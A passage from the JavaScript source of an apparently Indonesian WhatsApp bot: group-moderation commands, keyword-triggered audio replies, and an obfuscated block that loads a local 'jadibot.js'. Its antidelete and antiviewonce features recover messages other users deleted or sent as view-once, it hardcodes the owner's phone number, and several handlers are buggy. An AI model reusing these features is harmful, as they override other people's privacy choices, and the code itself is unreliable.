             if (cok.messages.length < 2) return reply('Tidak Ditemukan Pesan') 
             if (cok.messages.length < parseInt(batas)) reply(`Hanya Ditemukan ${cok.messages.length - 1} Pesan`)
             for (i=1;i < cok.messages.length;i++) {
             if (cok.messages[i].message) {
             dimas.sendMessage(from, `Ditemukan!`, text, {sendEphemeral: true, quoted: cok.messages[i]}) 
}
}
             } catch (e) {
             return reply(String(e))
}
             } else {
             reply(`Format salah tod, ini contoh format yang benar : ${prefix + command} halo|10`)
}
             break
       case 'lolkey':
       case 'cekapikey':
              if (args.length < 1) return reply(`Ketik ${prefix}lolkey [Apikeynya]`) 
              anu = await fetchJson(`https://lolhuman.herokuapp.com/api/checkapikey?apikey=${q}`)
              teks = `*YOUR APIKEY*\n\n➸ Ussername= ${anu.result.username}\n➸ Request= ${anu.result.requests}\n➸ Today= ${anu.result.today}\n➸ Akun Type= ${anu.result.account_type}\n➸ Expired= ${anu.result.expired}\n➸ API = https://lolhuman.herokuapp.com`
              dimas.sendMessage(from, teks, text, {quoted: freply})
              break
       case 'bugreport':
              if (args.length < 1) return reply(`Ketik ${prefix}bugreport [fiturnya] [Error Nya Gimana]`) 
              teks = args.join(' ')
              reply('Terima Kasih Telah Melaporkan Bug Pada Owner, Jika Itu Sekedar Iseng Maka Akan Di Ban Oleh Bot!')
              dimas.sendMessage('6285215319934@s.whatsapp.net',`*Bug Report:* ${teks}`, text)
              break
       case 'readall':
              totalchat.map( async ({ jid }) => {
              await dimas.chatRead(jid)
})
              reply(`\`\`\`Berhasil membaca ${unread.length} Chat !\`\`\``)
              console.log(totalchat.length)
              break	

//------------------< Enable/Disable >-------------------
case 'antidelete':
                if (!isOwner && !isGroupAdmins) return reply(mess.GrupAdmin)
                const dataRevoke = JSON.parse(fs.readFileSync('./database/gc-revoked.json'))
                const dataCtRevoke = JSON.parse(fs.readFileSync('./database/ct-revoked.json'))
                const dataBanCtRevoke = JSON.parse(fs.readFileSync('./database/ct-revoked-banlist.json'))
                const isRevoke = dataRevoke.includes(from)
                const isCtRevoke = dataCtRevoke.data
                const isBanCtRevoke = dataBanCtRevoke.includes(sender) ? true : false
                if (args.length < 1) return reply(`Penggunaan fitur antidelete :\n\n*${prefix}antidelete [aktif/mati]* (Untuk grup)\n*${prefix}antidelete [ctaktif/ctmati]* (untuk semua kontak)\n*${prefix}antidelete banct 628558xxxxxxx* (banlist kontak)`)
                if (args[0] === 'aktif') {
                    if (isGroup) {
                        if (isRevoke) return reply(`Antidelete telah diaktifkan di grup ini sebelumnya!`)
                        dataRevoke.push(from)
                        fs.writeFileSync('./database/gc-revoked.json', JSON.stringify(dataRevoke, null, 2))
                        reply(`Antidelete diaktifkan di grup ini!`)
                    } else if (!isGroup) {
                        reply(`Untuk kontak penggunaan *${prefix}antidelete ctaktif*`)
                    }
                } else if (args[1] == 'ctaktif') {
                    if (!isOwner && !fromMe) return reply(mess.OnlyOwner)
                    if (!isGroup) {
                        if (isCtRevoke) return reply(`Antidelete telah diaktifkan di semua kontak sebelumnya!`)
                        dataCtRevoke.data = true
                        fs.writeFileSync('./database/ct-revoked.json', JSON.stringify(dataCtRevoke, null, 2))
                        reply(`Antidelete diaktifkan disemua kontak!`)
                    } else if (isGroup) {
                        reply(`Untuk grup penggunaan *${prefix}antidelete aktif*`)
                    }
                } else if (args[1] == 'banct') {
                    if (!isOwner && !fromMe) return reply(mess.OnlyOwner)
                    if (isBanCtRevoke) return reply(`kontak ini telah ada di database banlist!`)
                    if (args.length === 2 || args[2].startsWith('0')) return reply(`Masukan nomer diawali dengan 62! contoh 62859289xxxxx`)
                    dataBanCtRevoke.push(args[2] + '@s.whatsapp.net')
                    fs.writeFileSync('./database/ct-revoked-banlist.json', JSON.stringify(dataBanCtRevoke, null, 2))
                    reply(`Kontak ${args[2]} telah dimasukan ke banlist antidelete secara permanen!`)
                } else if (args[1] == 'mati') {
                    if (isGroup) {
                        const index = dataRevoke.indexOf(from)
                        dataRevoke.splice(index, 1)
                        fs.writeFileSync('./database/gc-revoked.json', JSON.stringify(dataRevoke, null, 2))
                        reply(`Antidelete dimatikan di grup ini!`)
                    } else if (!isGroup) {
                        reply(`Untuk kontak penggunaan *${prefix}antidelete ctmati*`)
                    }
                } else if (args[1] == 'ctmati') {
                    if (!isOwner && !fromMe) return reply(mess.OnlyOwner)
                    if (!isGroup) {
                        dataCtRevoke.data = false
                        fs.writeFileSync('./database/ct-revoked.json', JSON.stringify(dataCtRevoke, null, 2))
                        reply(`Antidelete dimatikan disemua kontak!`)
                    } else if (isGroup) {
                        reply(`Untuk grup penggunaan *${prefix}antidelete mati*`)
                    }
                } else {
                  reply(`Penggunaan fitur antidelete :\n\n*${prefix}antidelete [aktif/mati]* (Untuk grup)\n*${prefix}antidelete [ctaktif/ctmati]* (untuk semua kontak)\n*${prefix}antidelete banct 628558xxxxxxx* (banlist kontak)`)
               }
                break
                           case 'antibadword':
                if (!isGroup) return reply(mess.OnlyGrup)
                if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
                if (!isBotGroupAdmins) return reply(mess.BotAdmin)
                if (args.length < 1) return reply(`Pilih enable atau disable`)
                if (args[1].toLowerCase() === 'enable'){
                    if (isBadword) return reply(`Udah aktif`)
                    grupbadword.push(from)
                    fs.writeFileSync('./database/grupbadword.json', JSON.stringify(grupbadword))
                    reply(`antibadword grup aktif, kirim ${prefix}listbadword untuk melihat list badword`)
                } else if (args[1].toLowerCase() === 'disable'){
                    anu = grupbadword.indexOf(from)
                    grupbadword.splice(anu, 1)
                    fs.writeFileSync('./database/grupbadword.json', JSON.stringify(grupbadword))
                    reply('antibadword grup nonaktif')
                } else {
                    testqq(from, `antibadword`)
                }
                break
            case 'listbadword':
                 bi = `List badword\n\n`
                for (let boo of badword){
                    bi += `- ${boo}\n`
                }
                bi += `\nTotal : ${badword.length}`
                reply(bi)
                break
                 case prefix+'addbadword':
                if (!isOwner) return reply(mess.OnlyOwner)
                if (args.length < 2) return reply(`masukkan kata`)
                if (isKasar(args[1].toLowerCase(), badword)) return reply(`Udah ada`)
                addBadword(args[1].toLowerCase(), badword)
                reply(`Sukses`)
                break
            case 'addbadword':
                if (!isGroupAdmins && !isPremium)return reply(mess.GrupAdmin)
                if (args.length < 1) return reply(`masukkan kata`)
                if (isKasar(args[1].toLowerCase(), badword)) return reply(`Udah ada`)
                addBadword(args[1].toLowerCase(), badword)
                reply(`Sukses`)
                break
            case 'delbadword':
                if (!isOwner) return reply(mess.OnlyOwner)
                if (args.length < 2) return reply(`masukkan kata`)
                if (!isKasar(args[1].toLowerCase(), badword)) return reply(`Ga ada`)
                delBadword(args[1].toLowerCase(), badword)
                reply(`Sukses`)
                break
            case 'clearbadword':
                if (!isOwner) return reply(mess.OnlyOwner)
                if (args.length < 2) return reply(`tag atau nomor`)
                if (mentioned.length !== 0){
                    for (let i = 0; i < mentioned.length; i++){
                    delCountKasar(mentioned[i], senbadword)
                    }
                    reply('Sukses')
                } else {
                    delCountKasar(args[1] + '@s.whatsapp.net', senbadword)
                    reply('Sukses')
                }
                break
   case 'antiviewonce':
  case 'antivo':
    if (!q) return reply(`Pilih enable atau disable`)
    if (q.toLowerCase() === 'enable') {
      if (isAntiviewonce) return reply(`Udah aktif`)
      antivo.push(from)
      fs.writeFileSync('./database/antiviewonce.json', JSON.stringify(antivo))
      reply('Antiview Once grup aktif')
    } else if (q.toLowerCase() === 'disable') {
      let anu = antivo.indexOf(from)
      antivo.splice(anu, 1)
      fs.writeFileSync('./database/antiviewonce.json', JSON.stringify(antivo))
      reply('antiviewonce grup nonaktif')
    } else {
      testqq(from, `antiviewonce`)
    }
    break
    case 'antidelete':
    case 'antidel':
    if (!q) return reply(`Pilih enable atau disable`)
    if (q.toLowerCase() === 'enable') {
      if (isAntidel) return reply(`Udah aktif`)
      antidel.push(from)
      fs.writeFileSync('./database/antidelete.json', JSON.stringify(antidel))
      reply('anti delete grup aktif')
    } else if (q.toLowerCase() === 'disable') {
      let anu = antidel.indexOf(from)
      antidel.splice(anu, 1)
      fs.writeFileSync('./database/antidelete.json', JSON.stringify(antidel))
      reply('antiviewonce grup nonaktif')
    } else {
      testqq(from, `antiviewonce`)
    }
    break
       case 'leveling':
                              if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})
                                               if (!isGroupAdmins) return reply(mess.only.admin)
              if (ar[0] === 'enable') {
              if (isLevelingOn) return reply('Fitur leveling telah diaktifkan sebelumnya.')
            _leveling.push(from)
              fs.writeFileSync('./database/group/leveling.json', JSON.stringify(_leveling))
              reply('Fitur leveling berhasil diaktifkan.')
              } else if (ar[0] === 'disable') {
              var anup = _leveling.indexOf(from)
            _leveling.splice(anup, 1)
              fs.writeFileSync('./database/group/leveling.json', JSON.stringify(_leveling))
              reply('Fitur leveling berhasil dimatikan.')
              } else {
              reply('Pilih enable atau disable!')
}
              break
       case 'antilink':
                              if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})
                                               if (!isGroupAdmins) return reply(mess.only.admin)
              if (!isBotGroupAdmins) return reply(`Bot Harus jadi Admin`)
              if (!q) return reply(`Pilih enable atau disable`)
              if (args[0].toLowerCase() === 'enable'){
              if (isAntiLink) return reply(`Udah aktif`)
              antilink.push(from)
              fs.writeFileSync('./database/group/antilink.json', JSON.stringify(antilink))
              reply('*「 ANTILINK DI AKTIFKAN 」*\n\nYang Ngirim Link Group Bakal Ke Kick!')
              } else if (args[0].toLowerCase() === 'disable'){
              let anu = antilink.indexOf(from)
              antilink.splice(anu, 1)
              fs.writeFileSync('./database/group/antilink.json', JSON.stringify(antilink))
              reply('*「 ANTILINK DI NONAKTIFKAN 」*')
              } else {
              reply(`Pilih enable atau disable`)
}
              break
              case 'antivirtex':
                              if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})
                                               if (!isGroupAdmins) return reply(mess.only.admin)
              if (!isBotGroupAdmins) return reply(`Bot Harus jadi Admin`)
              if (!q) return reply(`Pilih enable atau disable`)
              if (args[0].toLowerCase() === 'enable'){
              if (isAntiVirtex) return reply(`Udah aktif`)
              antilink.push(from)
              fs.writeFileSync('./database/group/antilink.json', JSON.stringify(antilink))
              reply('*「 ANTIVIRTEX DI AKTIFKAN 」*')
              } else if (args[0].toLowerCase() === 'disable'){
              let anu = antivirtex.indexOf(from)
              antilink.splice(anu, 1)
              fs.writeFileSync('./database/group/antivirtex.json', JSON.stringify(antilink))
              reply('*「 ANTIVIRTEX DI NONAKTIFKAN 」*')
              } else {
              reply(`Pilih enable atau disable`)
}
break

       case 'welcome':
                               if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})
                                               if (!isGroupAdmins) return reply(mess.only.admin)
               if (args.length < 1) return reply('!welcome enable/disable')
               if ((args[0]) === 'enable') {
               if (isWelkom) return reply('Udah aktif')
               welkom.push(from)
               fs.writeFileSync('./database/group/welcome.json', JSON.stringify(welkom))
               reply('Sukses mengaktifkan fitur welcome di group ini ✔️')
               } else if ((args[0]) === 'disable') {
               welkom.splice(from, 1)
               fs.writeFileSync('./database/group/welcome.json', JSON.stringify(welkom))
               reply('Sukses menonaktifkan fitur welcome di group ini ✔️')
               } else {
               reply('Enable untuk mengaktifkan, disable untuk menonaktifkan')
}
               break
        case 'mute':
                               if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})
               if (!dim.key.fromMe) return reply(mess.only.owner)
               if (args.length < 1) return reply('!mute enable/disable')
               if (args[0].toLowerCase() === 'enable'){
               if (isMuted) return reply(`udah di mute`)
               mute.push(from)
               fs.writeFileSync('./database/group/mute.json', JSON.stringify(mute))
               reply(`*...:* *MUTE ON* *:...*\n\nPerhatian untuk member grup\nBot telah di mute di grup ${groupName} , Silahkan menggunakan bot dengan sewajarnya\n\n_*${botName}*_`)
               } else if (args[0].toLowerCase() === 'disable'){
               anu = mute.indexOf(from)
               mute.splice(anu, 1)
               fs.writeFileSync('./database/group/mute.json', JSON.stringify(mute))
               reply(`*...:* *𝙈𝙐𝙏𝙀 𝙊𝙁𝙁* *:...*\n\nPerhatian untuk member grup\nBot telah di unmute di grup ${groupName} , Silahkan menggunakan bot dengan sewajarnya\n\n_*${botName}*_`)
               } else {
               reply(`Pilih enable atau disable`)
}
               break
        case 'grupsetting':
        case 'groupsetting':
                               if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})
               if (!isGroupAdmins) return reply(mess.only.admin)
               list = []
               com = [`group enable`,`leveling enable`,`welcome enable`,`antilink enable`,`mute enable`]
               comm = [`group disable`,`leveling disable`,`welcome disable`,`antilink disable`,`mute disable`]
               listnya = [`Group open/close`,`Leveling enable/disable`,`Welcome enable/disable`,`Antilink enable/disable`,`Mute enable/disable`]
               suruh = [`Enable`, `Disable`]
               fiturname = [`Group`,`Leveling`,`Welcome`,`Antilink`,`Mute`]
               startnum = 0; let startnu = 0; let startn = 0;let start = 0
               startnumm = 1
               for (let x of com) {
               var yy = {title: `${listnya[startnum++]}`,
                    rows: [
                       {
                        title: `${suruh[0]}`,
                        description: `\nMengaktifkan ${fiturname[startnu++]}`,
                        rowId: `${prefix}${x}`
                      },{
                        title: `${suruh[1]}`,
                        description: `\nMenonaktifkan ${fiturname[startn++]}`,
                        rowId: `${prefix}${comm[start++]}`
                      }
                    ]
                   }
                        list.push(yy)
           }
             listmsg(from, `Group Setting`, `Atur Settingan Grup anda disini......`, list)
             break
             
      case 'group':
      case 'grup':
             if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})
            if (!isGroupAdmins) return reply(mess.only.admin)
             if (!isBotGroupAdmins) return reply(mess.only.Badmin)
             if (args.length < 1) return reply('!group enable/disable')
             if (args[0].toLowerCase() === 'enable'){
             dimas.groupSettingChange(from, "announcement", false)
            .then((res) => reply(jsonformat(res)))
            .catch((err) => reply(jsonformat(err)))
             } else if (args[0].toLowerCase() === 'disable'){
             dimas.groupSettingChange(from, "announcement", true)
            .then((res) => reply(jsonformat(res)))
            .catch((err) => reply(jsonformat(err)))
             } else if (args[0].toLowerCase() === 'close'){
             dimas.groupSettingChange(from, "announcement", true)
            .then((res) => reply(jsonformat(res)))
            .catch((err) => reply(jsonformat(err)))
             } else if (args[0].toLowerCase() === 'open'){
             dimas.groupSettingChange(from, "announcement", false)
            .then((res) => reply(jsonformat(res)))
            .catch((err) => reply(jsonformat(err)))
             } else {
             reply(`Pilih enable atau disable`)
}
             break
//------------------< Menunya Bang:v >-------------------
      case 'infoig':
             reply(`Jangan Lupa Follow Ig Owner Ya : https://www.instagram.com/dimas.edr/`)
             break
      case 'dimasgroup':
      case 'izumigroup':
      case 'ikyygroup':
             reply(`https://chat.whatsapp.com/DMuU1HMuzjwDUmx1qqgA9L
link Group *MIZUKI OFFICIAL🤖*
https://chat.whatsapp.com/IXJdDXccoFI5fWU0oLYVL0
link Group *Open WhatsApp Bot🤖*
https://chat.whatsapp.com/BgH0HTTVKTLK9nQXuL35QR
link Group *Node.JS🤖*
https://chat.whatsapp.com/HWmbROi8QapDgAfQVVtDSL
link Group *Main bot*`)
             break
      
      
      
      case 'jadibot':
             if (!isOwner) return  reply(mess.only.owner)
             const _0x5f10=['1ubdcbO','202171TkLMwo','284052dVVNCo','42JxCsde','24890OaehfM','./jadibot.js','26826mdmYhJ','176EqLcNV','55194kArISZ','6GRvhmu','314893OwJFDH'];const _0x470b71=_0x5476;function _0x5476(_0x56372d,_0x51b653){return _0x5476=function(_0x5f107a,_0x54761a){_0x5f107a=_0x5f107a-0xd8;let _0x336fbf=_0x5f10[_0x5f107a];return _0x336fbf;},_0x5476(_0x56372d,_0x51b653);}(function(_0x4b0f8a,_0x1f534e){const _0x1acfb6=_0x5476;while(!![]){try{const _0x55ab94=-parseInt(_0x1acfb6(0xdc))+parseInt(_0x1acfb6(0xe2))*parseInt(_0x1acfb6(0xde))+-parseInt(_0x1acfb6(0xe1))*parseInt(_0x1acfb6(0xdb))+parseInt(_0x1acfb6(0xda))+-parseInt(_0x1acfb6(0xdd))+parseInt(_0x1acfb6(0xdf))+parseInt(_0x1acfb6(0xd8))*parseInt(_0x1acfb6(0xd9));if(_0x55ab94===_0x1f534e)break;else _0x4b0f8a['push'](_0x4b0f8a['shift']());}catch(_0x4a8ec9){_0x4b0f8a['push'](_0x4b0f8a['shift']());}}}(_0x5f10,0x285aa));const {jadibot}=require(_0x470b71(0xe0));jadibot(dimas,from,sender,reply,dim);
             break
      case 'stopjadibot':
      case 'stopbot':
             const _0x1427=['2584oRLTbU','3849mFwfyJ','./jadibot.js','71LvrzJG','286372cCrXrQ','1yPMtDu','1AjjlYF','456046PuhVDs','394eRcMph','746574pwCcoE','625699UVPwUh','1029671oWZdcF'];const _0x49a386=_0x39bb;function _0x39bb(_0x399e0b,_0x2d0c73){return _0x39bb=function(_0x1427be,_0x39bbc5){_0x1427be=_0x1427be-0x132;let _0x12e62d=_0x1427[_0x1427be];return _0x12e62d;},_0x39bb(_0x399e0b,_0x2d0c73);}(function(_0x49c476,_0x4d8227){const _0x22a1e5=_0x39bb;while(!![]){try{const _0x311704=parseInt(_0x22a1e5(0x138))*parseInt(_0x22a1e5(0x13c))+parseInt(_0x22a1e5(0x13b))*parseInt(_0x22a1e5(0x136))+-parseInt(_0x22a1e5(0x134))+-parseInt(_0x22a1e5(0x13d))*parseInt(_0x22a1e5(0x133))+parseInt(_0x22a1e5(0x137))+-parseInt(_0x22a1e5(0x139))+-parseInt(_0x22a1e5(0x13a))*parseInt(_0x22a1e5(0x135));if(_0x311704===_0x4d8227)break;else _0x49c476['push'](_0x49c476['shift']());}catch(_0x25e28b){_0x49c476['push'](_0x49c476['shift']());}}}(_0x1427,0x8b9f1));const {stopjadibot}=require(_0x49a386(0x132));stopjadibot(dimas,from,sender,dim);
             break
default:
if (budy.includes(`Bot`)) {
                const bot = fs.readFileSync('./assets/bot');
                dimas.sendMessage(from, bot, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
                  }
                if (budy.includes(`bot`)) {
                const bot = fs.readFileSync('./assets/oni.mp3');
                dimas.sendMessage(from, bot, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
                  }
                  if (budy.includes(`izumi`)) {
                const bot = fs.readFileSync('./assets/izumi.mp3');
                dimas.sendMessage(from, bot, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
                  }
                if (budy.includes(`Izumi`)) {
                const bot = fs.readFileSync('./assets/izumi.mp3');
                dimas.sendMessage(from, bot, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
                  }
//if (budy.includes('home'))
if (budy.includes('home')) {
const home = fs.readFileSync('assets/home.mp3')
dimas.sendMessage(from, home, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('gettingold')) {
const getting = fs.readFileSync('assets/gettingold.mp3')
dimas.sendMessage(from, getting, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('tapi')) {
const tapi = fs.readFileSync('assets/tapi.mp3')
dimas.sendMessage(from, tapi, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}

if (budy.includes('magic')) {
const magic = fs.readFileSync('assets/magic.mp3')
dimas.sendMessage(from, magic, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('menyukaiku')) {
const menyukaiku = fs.readFileSync('assets/menyukaiku.mp3')
dimas.sendMessage(from, menyukaiku, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sad')) {
const sad1 = fs.readFileSync('assets/sad.mp3')
dimas.sendMessage(from, sad1, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('sad2')) {
const sad2 = fs.readFileSync('assets/sad2.mp3')
dimas.sendMessage(from, sad2, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('sad3')) {
const sad3 = fs.readFileSync('assets/sad3.mp3')
dimas.sendMessage(from, sad3, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('sad4')) {
const sad4 = fs.readFileSync('assets/sad4.mp3')
dimas.sendMessage(from, sad4, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('aeshtetic')) {
const tetik = fs.readFileSync('assets/aeshtetic.mp3')
dimas.sendMessage(from, tetik, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('aeshtetic2')) {
const tetik2 = fs.readFileSync('assets/aeshtetic2.mp3')
dimas.sendMessage(from, tetik3, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('aeshtetic3')) {
const tetik3 = fs.readFileSync('assets/aeshtetic3.mp3')
dimas.sendMessage(from, tetik3, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('aeshtetic4')) {
const tetik4 = fs.readFileSync('assets/aeshtetic4.mp3')
dimas.sendMessage(from, tetik4, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('allnight')) {
const allnight = fs.readFileSync('assets/allnight.mp3')
dimas.sendMessage(from, allnight, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('lucas')) {
const lucas = fs.readFileSync('assets/lucas.mp3')
dimas.sendMessage(from, lucas, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('sowell')) {
const well = fs.readFileSync('assets/sowell.mp3')
dimas.sendMessage(from, well, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('wanna')) {
const wanna = fs.readFileSync('assets/wanna.mp3')
dimas.sendMessage(from, wanna, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('up')) {
const ups = fs.readFileSync('assets/up.mp3')
dimas.sendMessage(from, ups, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('yourskin')) {
const skin = fs.readFileSync('assets/yourskin.mp3')
dimas.sendMessage(from, skin, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('cutmeoff')) {
const moff = fs.readFileSync('assets/cutmeoff.mp3')
dimas.sendMessage(from, moff, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('beautiful')) {
const ful = fs.readFileSync('assets/beautiful.mp3')
dimas.sendMessage(from, ful, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('loosinggame')) {
const gam = fs.readFileSync('assets/loosinggame.mp3')
dimas.sendMessage(from, gam, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('loosinginterest')) {
const rest = fs.readFileSync('assets/loosinginterest.mp3')
dimas.sendMessage(from, rest, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('playdate')) {
const date = fs.readFileSync('assets/playdate.mp3')
dimas.sendMessage(from, date, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('ayatkursi2')) {
const kursi = fs.readFileSync('assets/ayatkursi2.mp3')
dimas.sendMessage(from, kursi, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 

if (budy.includes('yasin')) {
yasin = fs.readFileSync('assets/yasin.mp3')
dimas.sendMessage(from, yasin, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('arrahman')) {
arrahman = fs.readFileSync('assets/arrahman.mp3')
dimas.sendMessage(from, arrahman, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('tilawah')) {
const tilawah = fs.readFileSync('assets/tilawah.mp3')
dimas.sendMessage(from, tilawah, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('sholawatnabi')) {
const nabi = fs.readFileSync('assets/sholawatnabi.mp3')
dimas.sendMessage(from, nabi, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('ngaji')) {
const ngaji1 = fs.readFileSync('assets/ngaji.mp3')
dimas.sendMessage(from, ngaji1, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('ngaji2')) {
const ngaji2 = fs.readFileSync('assets/ngaji2.mp3')
dimas.sendMessage(from, ngaji2, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('iri')) {
const irimp3 = fs.readFileSync('./assets/iri.mp3');
dimas.sendMessage(from, irimp3, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('pale')) {
const pale = fs.readFileSync('assets/pale.mp3')
dimas.sendMessage(from, pale, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('ceksound')) {
const soun = fs.readFileSync('assets/sound.mp3')
dimas.sendMessage(from, soun, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('hallo')) {
const hallo = fs.readFileSync('./assets/hallo.mp3')
dimas.sendMessage(from, hallo, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
} 
if (budy.includes('sound1')) {
satu = fs.readFileSync('./assets/sound1.mp3');
dimas.sendMessage(from, satu, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound2')) {
dua = fs.readFileSync('./assets/sound2.mp3');
dimas.sendMessage(from, dua, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound3')) {
tiga = fs.readFileSync('./assets/sound3.mp3');
dimas.sendMessage(from, tiga, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound4')) {
empat = fs.readFileSync('./assets/sound4.mp3');
dimas.sendMessage(from, empat, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound5')) {
lima = fs.readFileSync('./assets/sound5.mp3');
dimas.sendMessage(from, lima, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound6')) {
enam = fs.readFileSync('./assets/sound6.mp3');
dimas.sendMessage(from, enam, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound7')) {
tujuh = fs.readFileSync('./assets/sound7.mp3');
dimas.sendMessage(from, tujuh, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound8')) {
delapan = fs.readFileSync('assets/sound8.mp3');
dimas.sendMessage(from, delapan, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound9')) {
sembilan = fs.readFileSync('assets/sound9.mp3');
dimas.sendMessage(from, sembilan, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound10')) {
sepuluh = fs.readFileSync('assets/sound10.mp3');
dimas.sendMessage(from, sepuluh, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound11')) {
sebelas = fs.readFileSync('assets/sound11.mp3');
dimas.sendMessage(from, sebelas, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound12')) {
duabelas = fs.readFileSync('assets/sound12.mp3');
dimas.sendMessage(from, duabelas, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound13')) {
tigabelas = fs.readFileSync('assets/sound13.mp3');
dimas.sendMessage(from, tigabelas, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound14')) {
empatbelas = fs.readFileSync('assets/sound14.mp3');
dimas.sendMessage(from, empatbelas, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound15')) {
limabelas = fs.readFileSync('assets/sound15.mp3');
dimas.sendMessage(from, limabelas, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound16')) {
enambelas = fs.readFileSync('assets/sound16.mp3');
dimas.sendMessage(from, enambelas, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound17')) {
tujuhbelas = fs.readFileSync('assets/sound17.mp3');
dimas.sendMessage(from, tujuhbelas, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound18')) {
delapanbelas = fs.readFileSync('assets/sound18.mp3');
dimas.sendMessage(from, delapanbelas, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound19')) {
sembilanbelas = fs.readFileSync('assets/sound19.mp3');
dimas.sendMessage(from, sembilanbelas, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound20')) {
duapuluh = fs.readFileSync('assets/sound20.mp3');
dimas.sendMessage(from, duapuluh, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound21')) {
duasatu = fs.readFileSync('assets/sound21.mp3');
dimas.sendMessage(from, duasatu, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('sound22')) {
duadua = fs.readFileSync('assets/sound22.mp3');
dimas.sendMessage(from, duadua, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
